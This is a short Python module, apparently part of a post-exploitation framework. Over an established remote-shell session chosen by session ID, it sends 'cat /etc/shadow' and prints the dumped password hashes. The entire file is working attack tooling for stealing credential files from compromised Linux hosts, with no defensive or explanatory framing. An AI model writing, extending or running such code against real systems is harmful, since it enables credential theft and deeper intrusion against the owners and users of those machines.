# post_expl/hashdump.py
from corelistener import session_handler

def run():
    try:
        sid = int(input("Enter SESSION ID: "))
    except:
        print("[-] Invalid input")
        return

    conn = session_handler.sessions.get(sid)
    if not conn:
        print("[-] Invalid session")
        return

    print("[*] Attempting to dump /etc/shadow")
    conn.send(b"cat /etc/shadow\n")
    conn.settimeout(0.2)

    out = b""
    while True:
        try:
            chunk = conn.recv(4096)
            if not chunk: break
            out += chunk
        except:
            break

    if out:
        print(out.decode(errors="ignore"))
    else:
        print("[-] No output (maybe no permissions?)")
